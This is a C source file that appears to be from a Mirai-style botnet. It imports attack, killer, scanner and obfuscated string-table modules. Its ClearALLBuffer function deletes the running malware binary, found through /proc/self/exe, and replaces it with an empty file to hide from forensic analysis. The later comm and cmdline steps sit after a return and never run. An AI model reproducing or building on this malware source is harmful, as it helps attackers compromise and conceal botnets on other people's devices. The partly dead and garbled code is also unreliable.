#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"   
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "buff.h"

/*
Clear Buffer Made by H4ReMiiXxYT
Selfrep#1337
*/

void ClearALLBuffer(void) {
#ifdef DEBUG
printf("[dbg / Clear Buffer]  Buffer Clearing Proccess Begging\n");
fflush(stdout);
printf("[DEBUG] STEP 1 ---> EXE\n");
fflush(stdout);
printf("[DEBUG] ClearALLBuffer() function called successfully!\n");
fflush(stdout);
#endif
 char buf[600];
    int len = 0;
    int fd = -1;

    table_unlock_val(PROC_SELF_EXE);
    if((len = readlink(table_retrieve_val(PROC_SELF_EXE, NULL), buf, sizeof(buf) - 1)) == -1)
    {
        return;
    }

    remove(buf);
#ifdef DEBUG
    printf("[DEBUG] CLEARED BUFFER -> EXE\n");
    fflush(stdout);
#endif

    if((fd = open(buf, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1)
    {
        return;
    }
#ifdef DEBUG 
    printf("[DEBUG] BUFFER REMADE -> EXE\n");
    fflush(stdout);
#endif
    
    table_lock_val(PROC_SELF_EXE);
    close(fd);
    return;




// COMM
#ifdef DEBUG
printf("[dbg / Clear Buffer] Clear Buffer Step 2 ---> COMM\n");
fflush(stdout);
#endif

char buffer2[600];


table_unlock_val(PROC_SELF_COMM);
if((len = readlink(table_retrieve_val(PROC_SELF_COMM, NULL), buffer2, sizeof(buffer2) -1 )) == -1) {
	return;
}

remove(buffer2);

#ifdef DEBUG
printf("[DEBUG] CLEARED BUFFER -> COMM\n");
fflush(stdout);
#endif

if((fd = open(buffer2, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1) {
	return;
}
#ifdef DEBUG
printf("[DEBUG] BUFFER REOPEND --> COMM\n"); 
fflush(stdout);
#endif
table_lock_val(PROC_SELF_COMM);
close(fd);
#ifdef DEBUG
printf("[DEBUG] STEP 2 COMPLETE\n");
fflush(stdout);
#endif


// CMDLINE


#ifdef DEBUG
printf("[DEBUG] Step 3 Clear Buffer ---> CMDLINE\n");
fflush(stdout);
#endif

char buffer3[600];

table_unlock_val(PROC_SELF_CMDLINE);
if((len = readlink(table_retrieve_val(PROC_SELF_CMDLINE, NULL), buffer3, sizeof(buffer3) -1)) == -1) {
	return;
}

remove(buffer3);

#ifdef DEBUG
printf("[DEBUG] CLEARED BUFFER -> CMDLINE\n");
fflush(stdout);
#endif

if((fd = open(buffer3, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1){
	return;
}

#ifdef DEBUG
printf("[DEBUG] BUFFER REOPEND --> CMDLINE\n");
fflush(stdout);
#endif
table_lock_val(PROC_SELF_CMDLINE);
close(fd);

#ifdef DEBUG
printf("[DEBUG] STEP 3 COMPLETE\n");
fflush(stdout);
#endif
}
